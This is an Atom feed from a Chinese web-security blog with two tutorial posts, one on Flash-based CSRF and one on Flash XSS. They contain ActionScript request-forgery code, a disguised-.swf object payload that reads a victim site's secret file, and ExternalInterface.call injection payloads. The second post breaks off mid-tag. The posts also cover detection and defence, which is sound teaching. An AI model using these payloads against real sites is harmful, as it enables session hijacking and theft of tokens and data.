<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Mi1k7ea.github.com/"/>
  <updated>2019-07-28T16:06:55.510Z</updated>
  <id>https://Mi1k7ea.github.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flash型CSRF总结</title>
    <link href="https://Mi1k7ea.github.com/2019/07/28/Flash%E5%9E%8BCSRF%E6%80%BB%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/07/28/Flash型CSRF总结/</id>
    <published>2019-07-28T06:45:15.000Z</published>
    <updated>2019-07-28T16:06:55.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h2><p>Flash功能丰富，我们可以使用其API来向任意站点发送请求，而且发送的请求会继承当前浏览器的会话。换句话说，我们可以利用Flash而非JavaScript来控制浏览器向目标URL发送请求，从而实现Flash CSRF攻击。</p><p>我们知道，通过Flash请求外部资源时，会先访问外域是否存在crossdomain.xml且判断Flash当前域是否在allow-access-from标签配置的domain内。当domain的值为通配符*时，表明该站资源对所有外域开放，等同于舍弃了Flash层面的同源策略的限制。</p><p>Flash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。</p><h2 id="0x02-攻击场景"><a href="#0x02-攻击场景" class="headerlink" title="0x02 攻击场景"></a>0x02 攻击场景</h2><p>使用Flash来发起CSRF攻击，一般用于绕过一些特定情形，下面就列两个常见的。</p><h3 id="场景1——绕过Referer等HTTP头字段检测"><a href="#场景1——绕过Referer等HTTP头字段检测" class="headerlink" title="场景1——绕过Referer等HTTP头字段检测"></a>场景1——绕过Referer等HTTP头字段检测</h3><p>很多时候，Web站点后台会对Referer字段进行校验，但是有时候会出现未校验无Referer字段等情况的缺陷。</p><p>用Flash发起的CSRF，可以去掉HTTP头中的Referer字段，从而可以绕过校验Referer字段（但未校验空Referer）来防御CSRF攻击的机制。除此之外，还能去掉Origin字段。</p><p>攻击原理和CSRF一样的，只不过从经典的伪造表单变成了触发swf文件的形式：</p><ol><li>攻击者编写恶意的Flash文件，用于从目标敏感页面中获取受害者的敏感信息或者获取页面的token值；</li><li>攻击者将该Flash文件上传至自己的服务器中，并诱使受害者访问加载该恶意Flash文件的页面；</li><li>受害者访问目标敏感页面后，在同一浏览器中被诱使访问攻击者服务器加载了恶意Flash文件的页面，此时的访问是会带上受害者在目标页面的会话的；</li><li>由于无Referer字段，Bypass了目标站点后台的CSRF防御机制，成功获取到页面token或用户敏感信息，实现了CSRF攻击；</li></ol><p>下面举两个不同方式的Demo。</p><h4 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h4><p>首先攻击者发现目标站点的crossdomain.xml存在Flash型CSRF风险：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后攻击者编写恶意Flash，用于在目标页面进行危险敏感的GET操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function CSRF():void</span><br><span class="line">&#123;</span><br><span class="line">var urlLoader:URLLoader=new URLLoader();</span><br><span class="line">var request:URLRequest=new URLRequest();</span><br><span class="line">request.url=&quot;http://a.com/m7.php&quot;;</span><br><span class="line">request.method=URLRequestMethod.GET;</span><br><span class="line">request.data=&quot;user=admin&amp;msg=GET_secret_content&quot;;</span><br><span class="line">urlLoader.load(request);</span><br><span class="line">&#125;</span><br><span class="line">CSRF();</span><br></pre></td></tr></table></figure><p>编译为swf文件后放置到攻击者的Web目录，然后诱使受害者访问，即可向目标站点通过GET方式带上受害者当前访问该页面的浏览器会话来发送敏感操作的请求：</p><p><img src="/2019/07/28/Flash型CSRF总结/3.png" alt=""></p><p><img src="/2019/07/28/Flash型CSRF总结/1.png" alt=""></p><h4 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import flash.net.URLRequest;</span><br><span class="line">import flash.system.Security;</span><br><span class="line">var url = new URLRequest(&quot;http://a.com/m7.php&quot;);</span><br><span class="line">var shellcode = new URLVariables();</span><br><span class="line">shellcode = &quot;user=admin&amp;msg=POST_hacker_content&quot;;</span><br><span class="line">url.method = &quot;POST&quot;;</span><br><span class="line">url.data = shellcode;</span><br><span class="line">sendToURL(url);</span><br><span class="line">stop();</span><br></pre></td></tr></table></figure><p>诱使受害者访问攻击者的页面后，触发Flash向目标页面发起POST请求，进行危险的操作：</p><p><img src="/2019/07/28/Flash型CSRF总结/4.png" alt=""></p><p><img src="/2019/07/28/Flash型CSRF总结/2.png" alt=""></p><p>可以明显看到，请求报文并没有Referer字段。</p><h3 id="场景2——上传Flash到目标站点绕过crossdomain"><a href="#场景2——上传Flash到目标站点绕过crossdomain" class="headerlink" title="场景2——上传Flash到目标站点绕过crossdomain"></a>场景2——上传Flash到目标站点绕过crossdomain</h3><p>有个知识点——Flash并不关心扩展名或者Content-Type。如果使用object标签嵌入文件，只要文件内容为有效的Flash文件，它就会被当作是Flash文件来执行。</p><p>简单说下利用过程：</p><ol><li>攻击者发现目标站点的crossdomain.xml中domain设置并不为*，而是几个其他域名；</li><li>攻击者搜索几个白名单域名中的子域名，寻找可上传文件的域名，如victim.com中允许上传图片文件，但校验了文件后缀名和Content-Type；</li><li>攻击者创建恶意Flash文件，并修改后缀名为jpg，然后通过篡改Content-Type将其上传到victim.com中；</li><li>获取到上传文件的地址后，攻击者使用类型为application/x-shockwave-flash的object标签将文件嵌入到攻击者服务器中，如attacker.com；</li><li>受害者访问了victim.com，然后在同一浏览器中被诱使访问attacker.com，触发了攻击者上传的恶意Flash，从而可使攻击者窃取CSRF的token或目标站点页面的敏感信息，实现CSRF攻击；</li></ol><p>类似的payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span> = <span class="string">"height ：1px ; width ：1px ; "</span> <span class="attr">data</span> = <span class="string">"http://victim.com/user/2292/profilepicture.jpg"</span> <span class="attr">type</span> = <span class="string">"application / x-shockwave-flash"</span> <span class="attr">allowscriptaccess</span> = <span class="string">"always"</span> <span class="attr">flashvars</span> = <span class="string">"c = read＆u = http://victim.com/secret_file.txt"</span> &gt;</span> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实际攻击利用案例可直接看如下链接，该作者发现了Paypal的Flash CSRF漏洞并在YouTube上进行了漏洞利用的演示：</p><p><a href="https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html</a></p><h2 id="0x03-检测方法"><a href="#0x03-检测方法" class="headerlink" title="0x03 检测方法"></a>0x03 检测方法</h2><p>检查网站的crossdomain.xml文件，如果allow-access-from标签中domain值设置为*则可能存在Flash CSRF漏洞；如果设置domain值为多个外域，需要人工分析是否存在风险。</p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>当站点不需要跨域请求资源时，尽量删除crossdomain.xml文件；</li><li>若需crossdomain.xml文件，则必须严格设置allow-access-from标签中domain的白名单；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://labs.detectify.com/2014/05/20/the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website/" target="_blank" rel="noopener">The lesser known pitfalls of allowing file uploads on your website</a></p><p><a href="https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html" target="_blank" rel="noopener">crossdomain.xml : Beware of Wildcards</a></p><p><a href="http://www.vuln.cn/6205" target="_blank" rel="noopener">Flash CSRF – _Dy</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSRF" scheme="https://Mi1k7ea.github.com/tags/CSRF/"/>
    
      <category term="Flash" scheme="https://Mi1k7ea.github.com/tags/Flash/"/>
    
  </entry>
  
  <entry>
    <title>Flash型XSS总结</title>
    <link href="https://Mi1k7ea.github.com/2019/07/21/Flash%E5%9E%8BXSS%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/07/21/Flash型XSS小结/</id>
    <published>2019-07-21T15:04:06.000Z</published>
    <updated>2019-07-28T06:54:57.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="Flash与ActionScript"><a href="#Flash与ActionScript" class="headerlink" title="Flash与ActionScript"></a>Flash与ActionScript</h3><p>Flash（交互式矢量图和Web动画标准）是一种动画创作与应用程序开发于一身的创作软件。Adobe Flash Professional CC为创建数字动画、交互式Web站点、桌面应用程序以及手机应用程序开发提供了功能全面的创作和编辑环境。Flash广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。可以在Flash中创建原始内容或者从其它Adobe应用程序（如Photoshop或illustrator）导入它们，快速设计简单的动画，以及使用Adobe ActionScript 3.0开发高级的交互式项目。设计人员和开发人员可使用它来创建演示文稿、应用程序和其它允许用户交互的内容。Flash可以包含简单的动画、视频内容、复杂演示文稿和应用。</p><p>ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。</p><p>目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。</p><h3 id="swf文件的编译与反编译"><a href="#swf文件的编译与反编译" class="headerlink" title="swf文件的编译与反编译"></a>swf文件的编译与反编译</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>使用Flex SDK，直接去官网下载，解压后进入bin目录输入如<code>mxmlc c:\..\..\xx.as</code>的命令，注意其是依赖于32位的JDK。</p><p>当然，也可以使用Adobe Flash CS系列软件。</p><p>看个示例，编写个弹框的swf文件：</p><p>1、使用Flex SDK：</p><p>编写Mi1k7ea.as文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入bin目录输入如<code>mxmlc c:\..\..\Mi1k7ea.as</code>的命令即可生成Mi1k7ea.swf文件：</p><p><img src="/2019/07/21/Flash型XSS小结/12.png" alt=""></p><p>放到Web目录访问即可触发：</p><p><img src="/2019/07/21/Flash型XSS小结/13.png" alt=""></p><p>2、使用Adobe Flash CS系列软件：</p><p>本地用的是Adobe Flash CS6。</p><p>编写如下fla文件：</p><p><img src="/2019/07/21/Flash型XSS小结/14.png" alt=""></p><p>然后Ctrl+Enter或者点击文件&gt;导出&gt;导出影片来编译成swf文件，再访问即可触发：</p><p><img src="/2019/07/21/Flash型XSS小结/15.png" alt=""></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><ul><li>FFDec或硕思闪客精灵软件</li><li>在线反编译网站：<a href="http://www.showmycode.com" target="_blank" rel="noopener">http://www.showmycode.com</a></li></ul><h3 id="Flash调用与跨域请求"><a href="#Flash调用与跨域请求" class="headerlink" title="Flash调用与跨域请求"></a>Flash调用与跨域请求</h3><p>Flash的调用和请求情形分别如下：</p><ol><li>HTML调用Flash时，Flash可以改后缀名；</li><li>Flash可以单独访问，但是其效果类似于HTML调用同域的Flash，但是后缀必须是swf；</li><li>Flash发动请求时，是根据Flash的域来判断的，而不是HTML来判断：</li></ol><p>（1）Flash请求同域资源时，直接忽视crossdomain.xml；</p><p>（2）Flash请求外域资源时，受外域下crossdomain.xml里的策略限制；</p><p>可知，Flash跨域请求时主要受crossdomain.xml文件的影响。</p><p>crossdomain.xml文件严格遵循XML语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如：<a href="http://www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。" target="_blank" rel="noopener">www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。</a></p><p>crossdomain.xml文件主要包含如下几个节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site-control，allow-access-<span class="keyword">from</span>，allow-access-<span class="keyword">from</span>-identity，allow-http-request-headers-<span class="keyword">from</span></span><br></pre></td></tr></table></figure><p>常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。</p><p>示例crossdomain.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">site-control</span> <span class="attr">permitted-cross-domain-policies</span>=<span class="string">"master-only"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许example.com及其子域访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许http://www.example.com访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"www.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">"*.csdn.net"</span> <span class="attr">headers</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：这个文件常常被用到Flash型CSRF中，当allow-access-from domain被设置为*后，可能存在Flash型CSRF的风险。</p><h3 id="Flash与相关的HTTP头字段"><a href="#Flash与相关的HTTP头字段" class="headerlink" title="Flash与相关的HTTP头字段"></a>Flash与相关的HTTP头字段</h3><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>Flash请求的Referer为空或者为该swf文件地址。</p><p>当为直接发请求的API时不带Referer；当HTML调用外域的Flash时，Flash发送的请求的Referer是Flash的地址而不是HTML的地址。</p><p>当HTML页面调用Flash时，此时Flash文件可以改后缀，那么我们请求的Referer就会变成Flash修改后对应的文件的后缀，比如Flash文件后缀改为gif，则通过该Flash请求时的Referer为<code>Referer: http://a.com/exp.gif</code>。</p><h4 id="x-flash-version"><a href="#x-flash-version" class="headerlink" title="x-flash-version"></a>x-flash-version</h4><p>Flash发送请求时会在HTTP头中添加x-flash-version字段来标识版本。</p><h3 id="Flash安全沙箱"><a href="#Flash安全沙箱" class="headerlink" title="Flash安全沙箱"></a>Flash安全沙箱</h3><p>Flash安全沙盒定义了各个Flash应用程序可以访问的数据及操作的范围，用于控制swf文件间跨域访问。如果两个域之间没有进行信任授权是无法进行数据交互的。</p><p>两个不同安全域下的swf文件之间是不能互相交互数据的。如果想让两个处于不同安全域内的swf文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。</p><h4 id="swf文件之间跨域访问的授权"><a href="#swf文件之间跨域访问的授权" class="headerlink" title="swf文件之间跨域访问的授权"></a>swf文件之间跨域访问的授权</h4><p>ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。</p><p>例如，<a href="http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：" target="_blank" rel="noopener">http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var loader:Loader =new Loader();</span><br><span class="line">loader.contentLoaderInfo.addEventListener(Event.INIT,init);</span><br><span class="line">var url:String=&quot;http://b.example.com/b.swf&quot;;</span><br><span class="line">loader.load(new URLRequest(url));</span><br><span class="line">function init(event:Event):void</span><br><span class="line">&#123;  trace(loader.content);&#125;</span><br></pre></td></tr></table></figure><p><a href="http://b.example.com/b.swf的代码：" target="_blank" rel="noopener">http://b.example.com/b.swf的代码：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Security.allowDomain(&quot;a.example.com&quot;);</span><br><span class="line">Security.allowDomain(&quot;*&quot;);</span><br></pre></td></tr></table></figure><p>上面是两种不同的设置方式：</p><ol><li><p>只允许a.example.com访问b.example.com中的SWF文件</p></li><li><p>如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。</p></li></ol><h4 id="HTML跨域加载Flash时的授权"><a href="#HTML跨域加载Flash时的授权" class="headerlink" title="HTML跨域加载Flash时的授权"></a>HTML跨域加载Flash时的授权</h4><p>在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。</p><p>allowScriptAccess：控制html页面与Flash页面的通讯。</p><ul><li>always：html和Flash页面的通讯不做任何的限制；</li><li>samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；</li><li>never：html和Flash禁止通讯。</li></ul><p>allowNetworking：控制Flash与外部的网络通讯。</p><ul><li>all：Flash所有的网络API通讯接口都可用；</li><li>internal：navigateToURL，fscommand，ExternalInterface.call不可用；</li><li>none：所有的网络API不可用。</li></ul><h3 id="HTML中嵌入Flash"><a href="#HTML中嵌入Flash" class="headerlink" title="HTML中嵌入Flash"></a>HTML中嵌入Flash</h3><p>在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签。</p><p>IE下嵌入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">codeBase</span>=<span class="string">"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0"</span> <span class="attr">classid</span>=<span class="string">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://example.com/exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非IE下嵌入（IE8能成功，本地最新IE11也OK）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"./exp.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"./exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非IE下嵌入的Demo示例，嵌入同源站点的Mi1k7ea.swf，其作用是弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox上访问直接触发，然而本地最新版的IE11也能成功嵌入触发：</p><p><img src="/2019/07/21/Flash型XSS小结/11.png" alt=""></p><h3 id="Flash的参数传递"><a href="#Flash的参数传递" class="headerlink" title="Flash的参数传递"></a>Flash的参数传递</h3><p>Flash的参数传递形式按ActionScript语言的版本来分：</p><ul><li>ActionScript 2：以<code>_root.argv</code>形式，argv直接就是参数名</li><li>ActionScript 3：以<code>loaderInfo.parameters</code>形式，返回key和value的字典结构。</li></ul><h2 id="0x02-Flash-XSS"><a href="#0x02-Flash-XSS" class="headerlink" title="0x02 Flash XSS"></a>0x02 Flash XSS</h2><p>Flash型XSS，即由Flash插件引起的一系列XSS问题，主要有以下两种方式：</p><ul><li>与JavaScript通信引发的XSS；</li><li>加载第三方资源引发的XSS；</li></ul><h3 id="ExternalInterface-call"><a href="#ExternalInterface-call" class="headerlink" title="ExternalInterface.call"></a>ExternalInterface.call</h3><p>Flash中可以使用ExternalInterface.call来执行JavaScript代码。</p><p>ExternalInterface.callzhong1可传递0个参数或传递多个参数，这里我们只探讨如下两个：</p><ul><li>ExternalInterface.call(“函数名”)</li><li>ExternalInterface.call(“函数名”,”参数”)</li></ul><h4 id="第一个参数可控"><a href="#第一个参数可控" class="headerlink" title="第一个参数可控"></a>第一个参数可控</h4><p>FlashXss.as，这里我们可以传入第一个参数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            var jsFunction:String = loaderInfo.parameters.movieName;</span><br><span class="line">            var param:String = &quot;Mi1k7ea&quot;;</span><br><span class="line">            ExternalInterface.call(jsFunction, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该as文件编译成swf文件：</p><p><img src="/2019/07/21/Flash型XSS小结/1.png" alt=""></p><p>将该swf放在Web目录下。尝试访问并输入payload<code>?movieName=alert</code>，在Chrome下不能成功执行swf而是变成了下载文件，换了Firefox和IE就可以了：</p><p><img src="/2019/07/21/Flash型XSS小结/2.png" alt=""></p><p>再次输入<code>?movieName=alert(&#39;hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/3.png" alt=""></p><p>使用IE的开发者工具调试，F12打开IE的开发人员工具-&gt;脚本-&gt;启动调试-&gt;全部中断，再次访问URL即可中断下来：</p><p><img src="/2019/07/21/Flash型XSS小结/6.png" alt=""></p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; __flash__toXML(alert(<span class="string">'hacked'</span>)(<span class="string">"Mi1k7ea"</span>)) ; &#125; <span class="keyword">catch</span> (e) &#123; <span class="string">"&lt;undefined/&gt;"</span>; &#125;</span><br></pre></td></tr></table></figure><p>上面这段代码是ExternalInterface.call底层代码。可以看到是对输入参数直接拼接到了相应的JavaScript代码中，而这段代码会先执行alert(‘hacked’)，然后将alert(‘hacked’)(“Mi1k7ea”)的返回值传入__flash__toXML()函数。</p><h4 id="第二个参数可控"><a href="#第二个参数可控" class="headerlink" title="第二个参数可控"></a>第二个参数可控</h4><p>FlashXss.as，这里我们只能控制传入第二个参数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            // 定义字符串变量名jsFunction，值从url的movieName获取</span><br><span class="line">            var param:String = loaderInfo.parameters.movieName;</span><br><span class="line">            ExternalInterface.call(&quot;console.log&quot;, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?movieName=\&quot;));alert(&#39;mi1k7ea&#39;);}catch(e){}//</code>：</p><p><img 